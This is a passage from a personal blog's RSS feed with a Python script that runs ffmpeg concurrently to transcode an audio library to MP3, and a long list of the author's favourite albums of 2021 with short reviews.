(Pdb)
</code></pre>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Concurrently transcode audio files to MP3 using ffmpeg and Python</title>
      <link>https://klingt.net/articles/concurrently-transcode-audio-files-to-mp3-using-ffmpeg-and-python.html</link>
      <description>A Python script that concurrently calls ffmpeg to transcode audio files to MP3.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A Python script that concurrently calls ffmpeg to transcode audio files to MP3.">
  
  <title>Concurrently transcode audio files to MP3 using ffmpeg and Python</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Concurrently transcode audio files to MP3 using ffmpeg and Python</h1>
<p>With the start of this year my Spotify subscription has ended and I'm now using Apple Music, mainly because it's part of my <a href="https://www.apple.com/de/apple-one/">Apple One</a> subscription, which not only makes it a lot cheaper than Spotify, Apple Music also allows me to hear my local music everywhere if it's on iCloud. However, that's where the advantages end, since Apple Music really sucks from a software quality standpoint. On iOS it's acceptable, but on macOS there were numerous crashes, it's kind of slow, and adding a single album to a playlist often ends in the album being added like a hundred times. Is there no QA for Apple desktop software anymore? I digress.</p>
<p>One limitation of Apple Music is, that it only supports a handful of audio file formats, i.e. there's no support for FLAC, OGG, OPUS and all the other good stuff. Some weeks ago I took NPR's <a href="https://www.npr.org/sections/therecord/2015/06/02/411473508/how-well-can-you-hear-audio-quality">audio quality test</a>, and found that I couldn't distinguish between losless and 128kbps MP3 in most cases. In the early days of MP3 this was easy, especially for acoustic music. I remember that hi-hats for example sounded &quot;watery&quot;, due to the bad codecs back then. However, those days are over, and modern MP3 codecs have gotten a lot better. So I decided to &quot;bite in the sour apple&quot; (that's not an English phrase, is it?) and convert my local library to MP3 so I can listen to it on the go in Apple Music.</p>
<p>I'm not a fan of bash scripts, at least not when they're longer than 5 lines. The natural choice, for me, is to use Python for such a scripting task. Below are the contents of <code>convert.py</code>, the script I wrote to convert the files concurrently.</p>
<pre><code class="language-python">#!/usr/bin/env python3

import concurrent
from concurrent.futures import ThreadPoolExecutor
import os
from pathlib import Path
import subprocess
import sys
from typing import List

source_dir = Path(sys.argv[1])
dest_dir = Path(sys.argv[2])
known_extensions = set([&quot;.m4a&quot;, &quot;.flac&quot;, &quot;.ogg&quot;])
source_files = []
for dirpath, _, filenames in os.walk(source_dir):
    for filename in filenames:
        p = Path(dirpath).relative_to(source_dir).joinpath(filename)
        if p.suffix in known_extensions:
            source_files.append(p)

# ...
</code></pre>
<p>In this first step we're collecting the file paths of all audio files having a <code>known_extensions</code> relative to the source directory. It's important that we have the relative path, because this will simplify the path handling of the destination path.</p>
<pre><code class="language-python">args_list = []
for source_file in source_files:
    source = source_dir.joinpath(source_file)
    dest = dest_dir.joinpath(source_file).with_suffix(&quot;.mp3&quot;)
    try:
        os.makedirs(dest.parent)
    except FileExistsError:
        print(f&quot;{dest.parent} already exists...&quot;)
    # https://trac.ffmpeg.org/wiki/Encode/MP3
    args_list.append(
        [
            &quot;ffmpeg&quot;,
            &quot;-i&quot;,
            str(source),
            &quot;-c:a&quot;,
            &quot;libmp3lame&quot;,
            &quot;-qscale:a&quot;,
            &quot;2&quot;,  # Use high quality encoding, 4 is default
            &quot;-abr&quot;,
            &quot;1&quot;,  # Enable average bitrate
            str(dest),
        ]
    )

# ...
</code></pre>
<p>In this section we build a list of arguments that we want to pass to the task function we use to schedule the work onto a thread pool. The speedup is almost linear, since <code>ffmpeg</code> will only use a single CPU core to transcode a file, hence this workload scales well with the number of available CPU cores. I decided to use average bit-rate (ABR), and the resulting files vary around 180kbps +/- 20kbps.
In a blind-test I could never tell that this is not 320kbps. If you disagree because you've golden ears, fine, I don't believe you can actually hear a difference 😛.</p>
<pre><code class="language-python">def run(args: List[str]):
    subprocess.run(
        args=args,
        check=True,
    )


with ThreadPoolExecutor(max_workers=4) as executor:
    futures = [executor.submit(run, args) for args in args_list]
    for future in concurrent.futures.as_completed(futures):
        future.result()
</code></pre>
<p>Lastly we're defining the task function called <code>run</code> (could've named it <code>task</code> of course) and then use a <a href="https://docs.python.org/3/library/concurrent.futures.html#threadpoolexecutor"><code>ThreadPoolExecutor</code></a> to schedule the workload onto 4 CPU cores. If you want to sature all your available CPU cores, use <code>multiprocessing.cpu_count()</code>. Python is fun 🥳</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>(Almost) 30 Best Albums of 2021</title>
      <link>https://klingt.net/articles/almost-30-best-albums-of-2021.html</link>
      <description>A list of my favorite albums that were (mostly) released in 2021.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A list of my favorite albums that were (mostly) released in 2021.">
  
  <title>(Almost) 30 Best Albums of 2021</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>(Almost 30) Best Albums of 2021</h1>
<p>Without further ado I admit being a music junkie.  I love discovering new music in my journey through online record stores or whenever I am in one of the local record shops.  One of the positive side effects of Covid was that people had more time listening to music and started buying records.  Vinyl sales were already on the rise over the past years, but the last two years has given them an extra boost that lead to new record stores popping up in Leipzig and elsewhere.</p>
<p>Stop buying crap, support your favorite artists instead!</p>
<h2>Roy Montgomery — 40th Anniversary 2021 LP Series</h2>
<p><img src="https://f4.bcbits.com/img/a1654242133_16.jpg" alt="Album Art of Roy Montgomery - 40th Anniversary 2021 LP Series"></p>
<p>Roy Montgomery.  <a href="https://grouper.bandcamp.com/">Grouper</a>'s 2009 <a href="https://www.discogs.com/master/214067-Roy-Montgomery-Grouper-Roy-Montgomery-Grouper">split EP</a> introduced me to the music of the New Zealand based guitarist and it also spawned my love for drone and ambient music.  I cannot exactly say what makes me love his music so much, but somehow the layered guitar tunes together with the ethereal reverb in the background create an atmosphere that makes me comfy, and which reminds of warm and sunny summer days that I spent in the country side (or that I just imagined while daydreaming).  For me it's just the perfect music to relax and drift away with my thoughts.</p>
<p>When <a href="https://www.grapefruitrecordclub.com/">Grapefruit Record Club</a> announced the 40th anniversary LP series I haven't given it a second thought and pre-ordered the vinyls the same day, planning to make myself a little christmas present.  But, shipping was delayed to January 2022 because of an unprecedented backup at pressing plants (<a href="https://www.vox.com/the-goods/2021/11/22/22797290/adele-vinyl-record-supply-chain-delays">damn you Adele!</a>).</p>
<p>Roy Montgomery might be best known for his work with Dadamah, an experimental rock/shoegaze group where he sang and played guitar.  Their sole album, <em>This is Not a Dream</em>, contains two tracks that still give me goosebumps whenever I listen to them, <a href="https://badabingrecords.bandcamp.com/track/too-hot-to-dry-2">Too Hot to Dry</a> and <a href="https://badabingrecords.bandcamp.com/track/high-tension-house-2">High Tension House</a>.  His music is melancholic while being still positive, hard to describe.  This tension might be the reason I'm so fascinated by it.</p>
<p>In an interview, I read about him, he said that he is a self-taught guitarist. This gives me hope that I can sometimes create similar atmospheres on my guitar.  One of my new year's resolutions is to finally take guitar lessons, no excuses anymore.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2966139599/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://grapefruit1.bandcamp.com/album/roy-montgomery-40th-anniversary-2021-lp-series">Roy Montgomery 40th Anniversary 2021 LP Series by Roy Montgomery</a></iframe>
<h2>Skee Mask — Pool</h2>
<p><img src="https://f4.bcbits.com/img/a2320122722_16.jpg" alt="Album Art of Skee Mask - Pool"></p>
<p>Another good year for Ilian Tape, a <a href="https://taz.de/Muenchner-Technolabel-Ilian-Tape/!5654614/">munich based techno label managed by the Zenker brothers</a> who are best known for their minimal techno releases.  This is not the first album of Skee Mask but a massive one, with more than one hundred minutes of listening time.  There are no fillers on this record, every track is worth a listen.  I would describe the album as a mixture of low-speed drum and bass, breakbeat and deep techno (it's okay to disagree with that, genre borders are fluid).  Not a record to listen on your kitchen radio though, this needs some headphones or speakers capable of producing a massive amount of low end.  Highly recommended record and maybe a future classic.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=222624053/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://iliantape.bandcamp.com/album/itlp09-pool">ITLP09 - Pool by Skee Mask</a></iframe>
<h2>Woulg - Bubblegum</h2>
<p><img src="https://f4.bcbits.com/img/a3596139616_16.jpg" alt="Album Art of Woulg - Bubblegum"></p>
<p>An album for the open minded electronic music lovers.  A potpourri of glitched, broken up and detuned samples sprinkled on top of blazing fast, metallic breaks with deep and earth shattering bass drums every once in a while.  Woulg is not only a talented IDM or breakcore producer, he also shows some of his producing techniques on <a href="https://www.youtube.com/user/woulg">YouTube</a>.  He released his first record on the infamous <a href="https://www.discogs.com/label/55101-illphabetik?page=2">illphabetik</a> breakcore netlabel, home of <a href="https://archive.org/details/ill030">Lisbent</a>.</p>
<p>The album cover should leave no doubt that this is nothing for the faint-hearted.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4125215390/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://woulg.bandcamp.com/album/bubblegum">Bubblegum by woulg</a></iframe>
<h2>Dean McPhee - Witch's Ladder</h2>
<p><img src="https://f4.bcbits.com/img/a0181296910_16.jpg" alt="Album Art of Dean McPhee - Witch's Ladder"></p>
<p>Over to something completely different to the above (and below) albums.  Dean McPhee, a UK based solo ambient and folk guitarist which I discovered through his previous record called <a href="https://deanmcphee.bandcamp.com/album/four-stones">Four Stones</a>.  Witch's Ladder is inspired by folklore, mysticism and the beautiful, wide open and lonely landscapes of northern England.</p>
<p>An album best listened to on a quiet evening with a wood fire or while watching the world fly by through a train window.  Enjoy.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3681494736/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://deanmcphee.bandcamp.com/album/witchs-ladder">Witch&#39;s Ladder by Dean McPhee</a></iframe>
<h2>Stazma the Junglechrist</h2>
<h3>Stazma — Leftovers</h3>
<p><img src="https://f4.bcbits.com/img/a0248618665_16.jpg" alt="Album Art of Stazma - Leftovers"></p>
<p>Stazma's leftovers are better than some other's best productions.  I have a soft spot for blazing breakcore beats, especially when they incorporate well versed rapping or funky Squarepusher'esque basslines on top.  There are dozens of excellent breakcore producers in France, <a href="https://rubymydear.bandcamp.com/">Ruby my Dear</a> or <a href="https://igorrr.bandcamp.com/">Igorrr</a> for example.  Still, Stazma is a master of his craft and shares his production techniques, like Woulg, with the rest of the world on <a href="https://www.youtube.com/channel/UCOiJihb6aQyKch4FDST3niw">YouTube</a>.</p>
<p>If you haven't gotten bored by the Amen break yet, and if you like hard and fast break beats then this is something you should listen to.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4185536392/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://stazma-the-junglechrist.bandcamp.com/album/leftovers">Leftovers by Stazma</a></iframe>
<h3>Repeat Eater — Deep Dessert Dweller</h3>
<p><img src="https://f4.bcbits.com/img/a0219005911_16.jpg" alt="Album Art of Repeat Eater - Deep Desert Dweller"></p>
<p>We aren't done with Stazma yet, even though this record was released under his alter ego <em>Repeat Eater</em>.  He produces detroit style techno or electro under this moniker.  The album was inspired by Frank Herbert's Dune, a story that received a <a href="https://www.youtube.com/watch?v=n9xhJrPXop4">very fine movie remake</a> this year.</p>
<p>Perfect music for driving on the Autobahn or to dance alone in your living room until the clubs reopen.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2268299090/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://touched.bandcamp.com/album/deep-desert-dweller">Deep Desert Dweller by Repeat Eater</a></iframe>
<h2>Harold Budd — Abandoned Cities</h2>
<p><img src="https://f4.bcbits.com/img/a2697139059_16.jpg" alt="Album Art of Harold Budd - Abandoned Cities"></p>
<p>Yet another album from a master of his genre.  Not a 2021 release, strictly speaking, but a re-release of Harold Budds' 1984 record <em>Abandoned Cities</em>.  This one is much darker than his other works and reminds me a bit of the early <a href="https://www.discogs.com/artist/10343-Tangerine-Dream">Tangerine Dream</a>.  Most mystery or sci-fi movies would benefit from a soundtrack like this.</p>
<p>A soundtrack for being outside on a starry night, but only if you're not afraid of the dark.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2344114403/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://haroldbudd.bandcamp.com/album/abandoned-cities">Abandoned Cities by Harold Budd</a></iframe>
<h2>Clark — Playground in a Lake</h2>
<p><img src="https://throttleclark.com/wp-content/uploads/2021/04/218911-2.png" alt="Album Art of Clark - Playground in a Lake"></p>
<p>Playground in a Lake, released on <a href="https://www.deutschegrammophon.com/">Deutsche Grammophon</a>, is a special album for Clark's standards.  The record starts with a cello melody that reminds me of <a href="https://www.youtube.com/watch?v=xULTMMgwLuo">The Elder Scrolls: Morrowind</a><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> soundtrack, which has to be taken as a compliment, I really like that one.  Clark, previously producing IDM or braindance records on <a href="https://warp.net/">Warp</a>, releases a very solid contemporary classic album here, that involves all his experience, with epic sound walls, catchy melodies and mysterious vibes alike.</p>
<p>This is a record for people pretending not to like classical music but are overwhelmed by good old Hollywood soundtracks.</p>
<p><a href="https://throttleclark.com/album/playground-in-a-lake/">https://throttleclark.com/album/playground-in-a-lake/</a></p>
<h2>Tommy Guerrero — Sunshine Radio</h2>
<p><img src="https://f4.bcbits.com/img/a1891857574_16.jpg" alt="Album Art of Tommy Guerrero - Sunshine Radio"></p>
<p>The californian Tommy Guerrero, former pro skateboarder, now a professional musician is living the dream (at least I hope he does &#x1f605;).  His music is best described as a fusion of Instrumental Rock, Jazz, Funk and Downtempo<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> influenced by hot shimmering air, cacti, yucca, agaves and tequila at sundown.  Okay, that's just my mental picture of his music but I still think it gives you an idea of what to expect.</p>
<p>Hear this, or his other records, if you want to get in a good mood or if you want to relax on a hot summer evening.  Best listened to with friends, some beers and a joint &#x1f33f;.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=374561757&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Loscil — Clara</h2>
<p><img src="https://f4.bcbits.com/img/a3445442629_16.jpg" alt="Album Art of Loscil - Clara"></p>
<p>An ambient gem released on <a href="https://kranky.bandcamp.com/">Kranky</a>, one of the few record labels I really admire because of their consistently great output.  Loscil has a large back catalogue of great ambient albums, and this one is no different.  Sourced from a three minute record of an Hungarian twenty-two string orchestra the album has a more natural touch than ambient records produced completely inside the box, i.e. by software synths.  Nothing against software synths and artificial sounds, but sometimes sampling real instruments gives the little touch which makes a good album into a great one.</p>
<p>Perfect album to listen to on a trip to Scandinavia or Canada in autumn or winter months.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4149141204/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://loscil.bandcamp.com/album/clara">Clara by loscil</a></iframe>
<h2>Simon Farintosh — Aphex Twin for Guitar</h2>
<p><img src="https://www.thisisclassicalguitar.com/wp-content/uploads/2021/02/Aphex-Twin-Guitar-Farintosh-1024x924.png" alt="Album Art of Simon Farintosh - Aphex Twin for Guitar"></p>
<p>There are not many artists that had a greater influence on my music taste and life in general than <a href="https://aphextwin.warp.net/">Aphex Twin</a>, <a href="https://autechre.warp.net/">Autechre</a> and <a href="https://venetiansnares.bandcamp.com/">Venetian Snares</a>.  I love everything they do and especially what they did.  In 2005 <em>Alarm Will Sound</em> released <a href="https://alarmwillsound.bandcamp.com/album/acoustica">Acoustica</a>, an orchestral interpretation of Aphex' early work.  No different is this record of Simon Farintosh, another UK based guitarist.</p>
<p>Listen to this if you like Aphex Twin, if not listen to it as well.  You don't have a choice.</p>
<p><a href="https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1">https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1</a></p>
<h2>Darkthrone — Eternal Hails......</h2>
<p><img src="https://f4.bcbits.com/img/a1849020328_16.jpg" alt="Album Art of Darkthrone - Eternal Hails......"></p>
<p>I do not know much about Norwegian black/heavy metal institution Darkthrone, except that I like this album.  Mainly because it's rough and primitive, both in terms of sound and atmosphere.  Nothing is worse than those hipster metal bands with their crystal clear productions and triggered base drums.  A solid black metal album must be a bit filthy, and this one is filthy enough without sounding like it was recorded in a bathroom through an 80s cassette recorder (this is the other extreme).</p>
<p>Do you hate social media as much as I do?  If so, this is the album for you.  Otherwise, just head over to Twitter and annoy like minded people with your garbage.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=1173323261/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://peaceville.bandcamp.com/album/eternal-hails">Eternal Hails...... by Darkthrone</a></iframe>
<h2>VC-118A — Spiritual Machines</h2>
<p><img src="https://f4.bcbits.com/img/a1898546476_16.jpg" alt="Album Art of VC-118A - Spiritual Machines"></p>
<p>Finland based producer VC-118A makes electro that almost counts as braindance or IDM.  Groovy beats combined with rattling percussion, spheric drones, glitchy artifacts and shimmering reverb.  An album that would even make HAL-9000 <a href="https://www.youtube.com/watch?v=YjQJeMF7HM8">dance like he's selling nails</a><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
<p>Have you booked your first trip to space?  This is the album you should hear on your way into orbit.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=1434495374&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Savana Funk — Tindouf</h2>
<p><img src="https://f4.bcbits.com/img/a2332196434_16.jpg" alt="Album Art of Savana Funk - Tindouf"></p>
<p>Production on this record is not very great, the noise floor is loud enough that you can hear it even on speakers, let alone headphones.  However, the music easily makes up for this luxury problem.  With Tindouf Savana Funk has recorded a fantastic funk album that takes influences from north african music and feels timeless, in the sense that it could have been produced in the 70s as well.</p>
<p>This could be the soundtrack for your next trip to Algeria or Morocco, or to Italy, because that's where the band is located.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=1166271148/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://savanafunk.bandcamp.com/album/tindouf">Tindouf by SAVANA FUNK</a></iframe>
<h2>Wolff Parkinson White</h2>
<p><a href="https://www.jochenrueckert.net/#wolff-parkinson-white">Jochen Rueckert</a>, a New York based Jazz Drummer, is releasing experimental electronic records with very complex rhythmic patterns and pretty uncommon melodies under his moniker <em>Wolff Parkinson White</em>.  I would label his music as breakcore or IDM.  Album descriptions of his Wolff Parkinson White records always state that <em>&quot;Jochen does not play drums on this recording&quot;</em>.  I would assume that no real human could play those drum patterns anyway &#x1f916;.</p>
<h3>Veritable Rapunzel</h3>
<p><img src="https://f4.bcbits.com/img/a1622753268_16.jpg" alt="Album Art of Wolff Parkinson White - Veritable Rapunzel"></p>
<p>A Cambrian explosion of samples, thrown at you in supersonic speed and razor-sharp precision.  This last sentence is utter nonsense but I always wanted to include the <em>Cambrian explosion</em> into a review.  Anyways, Veritable Rapunzel is a chaotic mess that forces you into a sensory overload, if listened in full and twice in a row.  Just give it a listen and you will know what I mean.</p>
<p>If CPUs could dream in sleep mode this would be their soundtrack.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=3924502164&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h3>Off World</h3>
<p><img src="https://f4.bcbits.com/img/a0162131558_16.jpg" alt="Album Art of Wolff Parkinson White &amp; Jayden Chisholm - Off World"></p>
<p>Rueckert's second release this year.  This time featuring Hayden Chrisholm, who does vocals on this album.  The record is a bit more jazzy than <em>Veritable Rapunzel</em>, yet it still has hyper complex beats with melodic elements that sometimes feel (intentionally) out of tune.  I would say that those ultra fast polyrhythmic beats with the slightly skewed melodics are Wolff Parkinson White's signature sound.  Advanced listening material.</p>
<p>An album to impress an artsy-fartsy person whose favorite cocktail is a cosmopolitan.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=3696636598&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Heliochrysum — We Become Mist</h2>
<p><img src="https://f4.bcbits.com/img/a0912067017_16.jpg" alt="Album Art of Heliochrysum - We Become Mist"></p>
<p>This is the debut album of the Los Angeles based composer and sound designer duo Heliochrysum.  When hearing this album for the first time it reminded me of Blade Runner.  Production on this album is top notch, we get a great mixture of industrial like noises, massive drones, piano sounds and sometimes a heavy bass drum hit.  Everything about this album feels cinematic, which might be because <a href="https://en.wikipedia.org/wiki/Ben_Frost">Ben Frost</a> did the final mix.  I really hope that we see another album of the duo in the near future.</p>
<p>Have you watched the launch of the James Webb space telescope?  This is your album then!</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3755221744/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://heliochrysum.bandcamp.com/album/we-become-mist">We Become Mist by Heliochrysum</a></iframe>
<h2>Pessimista - Ocaso</h2>
<p><img src="https://f4.bcbits.com/img/a0718026457_16.jpg" alt="Album Art of Pessimista - Ocaso"></p>
<p>This best of list is really a roller coaster ride of musical genres.  Ocaso is a rather simple Black Metal album and in no terms perfect, but I do like its rawness combined and the punk rock influence.  My favorite track is <em>Se Ícaro soubesse o que sei agora...</em> which translates to <em>If Icarus knew what I know now...</em> if we can trust Google translate.  The record reminds me of black metal concerts in dark, shabby and smoky clubs.  Let's hope that there will be (more) concerts again in 2022.</p>
<p>Perfect album for one who sees the glass as half empty.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3120607925/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://pessimista.bandcamp.com/album/ocaso">Ocaso by Pessimista</a></iframe>
<h2>Crypt Monarch — The Necronaut</h2>
<p><img src="https://f4.bcbits.com/img/a1170320464_16.jpg" alt="Album Art of Crypt Monarch - The Necronaut"></p>
<p>This should be the first doom metal LP in the list.  Due to their bass heavy, down tuned and slow riffs listening to doom metal is almost meditative.  Of course, the more than 10 minute runtime for every track are an important factor as well.  I do like to listen to doom, be it stoner doom or whatever sub genre, while programming because it's not obtrusive and helps to concentrate on the work.  So, what makes this album special now?  I actually do not know, there's just the fact that I listened to it multiple times and that it feels very solid, sound and production wise.</p>
<p>&#x1f6b6; &#x1f3d9;&#xfe0f; &#x1f33f;</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4231458351/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://cryptmonarch.bandcamp.com/album/the-necronaut">The Necronaut by Crypt Monarch</a></iframe>
## Tarika Blue — Self Titled
<p><img src="https://f4.bcbits.com/img/a3851404934_16.jpg" alt="Album Art of Tarika Blue - Self Titled"></p>
<p>Tarika Blue's self titled album is not a 2021 release, instead its a reissue of the record originally released in 1974.  Their music is best described as a fusion of jazz, soul and disco.  <a href="https://www.whosampled.com/sample/8049/Erykah-Badu-Didn%27t-Cha-Know-Tarika-Blue-Dreamflower/">Erykah Badu sampled</a> the track <em>Dreamflower</em> on her 2001 hit <em>Didn't Cha Know</em>.  Super smooth record, great vocals, nice guitar licks and funky drums.</p>
<p>Too good to be just a sample source for hip hop beats, give it a spin and hear for yourself.</p>
<p>Update: The album was removed from Bandcamp for some reason, so I'll link to its <a href="https://www.discogs.com/release/15700139-Tarika-Blue-Tarika-Blue">discogs page</a> instead.</p>
<h2>Swami Lateplate — Doom Jazz</h2>
<p><img src="https://f4.bcbits.com/img/a4055416360_16.jpg" alt="Album Art of Swami Lateplate - Doom Jazz"></p>
<p>Doom Jazz is a self describing tite and tells you exactly where to put this album.  If you know <a href="https://en.wikipedia.org/wiki/Bohren_%26_der_Club_of_Gore">Bohren &amp; der Club of Gore</a> then this sound will be familiar to you.  I really like that this albums comes without brass instruments and vocals.  It's pretty hard to find a good jazz record that is not drowned in saxophone nonsense, for some reason sax players often need to show off and give solo parts that almost sound like they're on the edge of getting a heart attack.</p>
<p>Best played on headphones while slandering through barely lit side streets on a rainy, full moon summer night.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=718302455/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://swamilateplate.bandcamp.com/album/doom-jazz">Doom Jazz by Swami Lateplate</a></iframe>
<h2>Worm — Foreverglade</h2>
<p><img src="https://f4.bcbits.com/img/a1911764557_16.jpg" alt="Album Art of Worm - Foreverglade"></p>
<p>Florida death metal outfit Worm is gifting us with a real banger on the <a href="https://listen.20buckspin.com/">20 Buck Spin</a> label<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.  Not sure how to label this album, maybe death metal or funeral doom, does not really matter anyways because the music is absolutely excellent and miles above their previous, debut album.  Let me admit that I'm the type of guy how rates an album by its cover, and let me tell you that this method works in at least <a href="https://en.wikipedia.org/wiki/Pareto_principle">four out of five cases</a>.  This is one of those four cases, I mean just look at this cover, as if M. C. Escher and Hieronymus Bosch had a frankensteinian love child (however that could be).  A no bullshit record that keeps on giving over the whole playtime, highly recommended.</p>
<p>Ever did a tour thorugh the Florida swamps?  Me neither, but if you do, take this album with you.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=713549408/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=smal]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Concurrently transcode audio files to MP3 using ffmpeg and Python</title>
      <link>https://klingt.net/articles/concurrently-transcode-audio-files-to-mp3-using-ffmpeg-and-python.html</link>
      <description>A Python script that concurrently calls ffmpeg to transcode audio files to MP3.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="A Python script that concurrently calls ffmpeg to transcode audio files to MP3.">
  
